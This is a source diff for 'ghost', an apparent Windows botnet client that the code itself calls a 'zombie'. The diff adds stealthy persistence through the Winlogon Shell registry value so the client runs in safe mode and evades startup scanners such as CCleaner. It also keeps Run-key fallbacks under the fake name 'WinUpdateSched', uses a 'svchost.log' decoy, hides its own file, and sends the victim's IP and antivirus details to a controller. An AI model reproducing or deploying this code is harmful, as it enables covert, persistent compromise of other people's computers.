@@ -20,15 +20,20 @@
 	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#define						AHXRLOGGER_PLUGIN // https://github.com/AHXR/ahxrlogger
+#define						GHOSTVER						"1.0.3b"
+#define						AHXRLOGGER_PLUGIN				// https://github.com/AHXR/ahxrlogger
 #define						DEFAULT_BUFF					19056
 #define						TMPLOG							"svchost.log"
-#define						KEY_TARGET						HKEY_LOCAL_MACHINE
+//#define						GHOST_HIDE	/* DEBUG */
+
+// 64-bit automatically redirected to "HKLM\SOFTWARE\Wow6432Node"
+#define						KEY_TARGET						HKEY_LOCAL_MACHINE 
 #define						KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
 #define						KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 #define						KEY_NON_ADMIN_STARTUP			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define						KEY_ROOT_STARTUP				"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
 #define						KEY_VALUE_NAME					"WinUpdateSched"
-//#define						GHOST_HIDE /* DEBUG */
+#define						KEY_SHELL_NAME					"Shell"
 
 #include					"ahxrwinsock.h"
 #include					"resource.h"
@@ -42,7 +47,6 @@
 #include					<string>
 #include					<Lmcons.h>
 
-
 using namespace				std;
 using namespace				System::Runtime::InteropServices;
 using						json = nlohmann::json;
@@ -54,6 +58,7 @@ TCHAR						str_windows[MAX_PATH];
 char						c_temp_cmd[ MAX_PATH + 20 ];
 char						c_cmd_dir[MAX_PATH + 7];
 bool						b_cmd;
+bool						b_admin_access;
 AHXRCLIENT					client;
 
 void						onClientConnect();
@@ -124,22 +129,49 @@ void main(cli::array<System::String^>^ args)
 
 	remove(c_temp_cmd); // Remove previous instance.
 
-	// Adding to start-up.
+	/*
+		Attempting to add to the Shell start-up. This is so that the zombie runs in safemode as well.
+		This will also hide this application from CCleaner or any other application that scans for start-up 
+		programs.
+	*/
 	HKEY h_key;
 	long l_key;
+	bool b_good;
 
-	l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
-
-	// No admin access. Just make it user startup.
-	if (l_key == ERROR_ACCESS_DENIED)
-		l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
+	l_key = RegOpenKeyEx(KEY_TARGET, KEY_ROOT_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
 
 	if (l_key == ERROR_SUCCESS) {
 		char * full_path = new char[MAX_PATH + 50];
-		sprintf(full_path, "\"%s\" %s %s", c_path, str_host, str_port);
+		sprintf(full_path, "explorer.exe,\"%s %s %s\"", c_path, str_host, str_port);
+		long l_set_key = RegSetValueEx(h_key, KEY_SHELL_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
 
-		RegSetValueEx(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
+		fstream ftest("regtest.txt", ios::out);
+		ftest << KEY_ROOT_STARTUP << endl << KEY_SHELL_NAME << endl << full_path;
+		ftest.close();
+
+		if (l_set_key == ERROR_SUCCESS)
+			b_good = true;
+
 		RegCloseKey(h_key);
+	}
+
+	if (!b_good) {
+		// Adding to start-up since we couldn't use the Shell start-up.
+		l_key = RegOpenKeyEx(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
+
+		// No admin access. Just make it user startup.
+		if (l_key == ERROR_ACCESS_DENIED) {
+			l_key = RegOpenKeyEx(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key);
+			b_admin_access = true;
+		}
+
+		if (l_key == ERROR_SUCCESS) {
+			char * full_path = new char[MAX_PATH + 50];
+			sprintf(full_path, "\"%s\" %s %s", c_path, str_host, str_port);
+
+			RegSetValueEx(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
+			RegCloseKey(h_key);
+		}
 	}
 
 	SetFileAttributes((char *)c_path, FILE_ATTRIBUTE_HIDDEN);
@@ -198,6 +230,7 @@ void onClientConnect() {
 	sys_data["IP"] = real_ip();
 	sys_data["PORT"] = str_port;
 	sys_data["AV"] = getAntivirus();
+	sys_data["VERSION"] = GHOSTVER;
 
 	OSVERSIONINFO vi;
 	vi.dwOSVersionInfoSize = sizeof(vi);
